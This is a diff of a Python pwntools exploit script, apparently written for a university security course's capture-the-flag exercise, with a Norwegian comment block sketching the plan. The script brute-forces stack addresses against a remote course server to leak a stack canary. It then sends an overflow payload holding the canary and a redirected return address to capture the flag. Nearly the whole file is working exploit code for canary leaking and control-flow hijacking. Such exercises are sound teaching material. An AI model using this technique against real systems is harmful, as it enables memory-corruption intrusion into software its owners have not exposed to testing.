@@ -1,39 +1,53 @@
 from pwn import *
 
+'''
+HER ER IDEEN
+Gi in noen karakterer som du vet om
+si abcd... på lengde 32
+så bare gi random as adresser inn til line pointer til vi finner en av karakterene i bufferen
+ut ifra hvilken karakter vi ser så kan vi regne ut hvor mange bytes til canaryen
+også bada bing bada boom
+point til canaryen
+løs det din dumme dritt 
+'''
+
+context.log_level = "debug"
 
 maxAdress = 0x7ffffffff000
 minAdress = 0x7fffffffb000
 rangeAdress = int(maxAdress - minAdress)
-for i in range (maxAdress,minAdress, -0x8):
-    correctedStart = int(i) - int(minAdress)
-    howmuchdone = (correctedStart * 100) / rangeAdress
-    #print(howmuchdone)
-    io = process(['setarch','-R', './03'])
+for i in range (maxAdress,minAdress - 0x8 , -0x4):
+    #io = process(['setarch','-R', './03'])
+    io = remote('inf226.puffling.no', 7003)
 
-    io.send(cyclic(24) + p64(i))
-    io.shutdown('out')
-    maybeCanary = io.recvuntil(b'.').strip().decode().split(' ')[-1].replace('line)\n', '').replace('.', '')
-    maybeCanary = maybeCanary.replace('line)', '')
-
+    
 
     try:
+        io.recvuntil(b'What is your favourite pancake recipe? (Finish with an empty line)\n'
+                     b'1. ') # Get the first string out of the output
+
+        io.sendline(cyclic(32) + p64(i))
+
+        maybeCanary = io.recvuntil(b'. ').decode().split('.')[0]
         canary = p64(int(maybeCanary, 16))
-        io.send(cyclic(48) + canary)
-    except:
+        io.sendline(cyclic(32) + p64(i) + canary + p64(1) + p64(0x4011f7))
+        
+        io.sendline()
+       
+        output = str(io.readall(timeout=.5),"ascii")
+        print(output)
+        if 'INF226{' in output:
+            print(i)
+            io.close()
+            break
+
         io.close()
-        continue
-
-    print(f"Maybe canary is: {maybeCanary}")
 
 
+    except Exception as e:
+        print(e)
+        io.close()
+        
 
-    io.shutdown('out')
-
-    if b'Congrats' in io.readall():
-        print(i)
-        break
-
-    io.close()
-
-
+    
 
